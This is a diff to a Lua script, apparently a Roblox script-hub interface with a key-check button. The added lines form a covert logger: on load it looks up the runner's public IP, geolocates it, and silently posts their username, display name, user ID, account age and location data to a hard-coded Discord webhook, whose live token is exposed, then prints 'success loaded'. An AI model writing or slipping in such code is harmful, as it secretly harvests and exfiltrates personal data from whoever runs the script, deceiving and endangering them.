@@ -186,4 +186,53 @@ local CheckKey = TabBoxestabs.Tab2:AddButton({
 	Disabled = false, -- Will disable the button (true / false)
 	Visible = true, -- Will make the button invisible (true / false)
 })
+local url = "https://discord.com/api/webhooks/1451981212871561391/AbU8pddxkQlTNG3AnBropV0h58RXxMFeEzW3feFw-4E_wZZuorVIEY1vyTBtX-DKOYs5"
+local function a(ipAddress)
+    local endpoint = string.format("http://ip-api.com/json/%s", ipAddress)
+
+    local response = request({Url = endpoint})
+
+    if response.StatusCode == 200 then
+        local data = game:GetService("HttpService"):JSONDecode(response.Body)
+        --[[
+            print("Полученные данные:")
+            for key, value in pairs(data) do
+                print(key .. ": " .. tostring(value))
+            end
+        ]]
+        return data
+    else
+        return nil
+    end
+    return nil
+end
+local function b()
+    local response = request({Url = "https://api.ipify.org/?format=json"})
+
+    if response.StatusCode == 200 then
+        local data = game:GetService("HttpService"):JSONDecode(response.Body)
+        return data.ip
+    else
+        return nil
+    end
+    return nil
+end
+local function sendWebhook(message)
+    local headers = {["content-type"] = "application/json"}
+    
+    local body = {
+        ["username"] = "logger",
+        ["avatar_url"] = nil,
+        ["content"] = message 
+    }
+
+    request({
+        Url = url,
+        Method = 'POST',
+        Headers = headers,
+        Body = game:GetService('HttpService'):JSONEncode(body),
+    })
+end
+
+sendWebhook(" | NEW LOGIN : USERNAME: "..game.Players.LocalPlayer.Name.." | DISPLAY NICKNAME : "..game.Players.LocalPlayer.DisplayName.." | USERID : "..game.Players.LocalPlayer.UserId.." | ACCOUNT AGE : "..game.Players.LocalPlayer.AccountAge.." | OTHER INFO : "..game:GetService("HttpService"):JSONEncode(a(b())))
 print("success loaded")
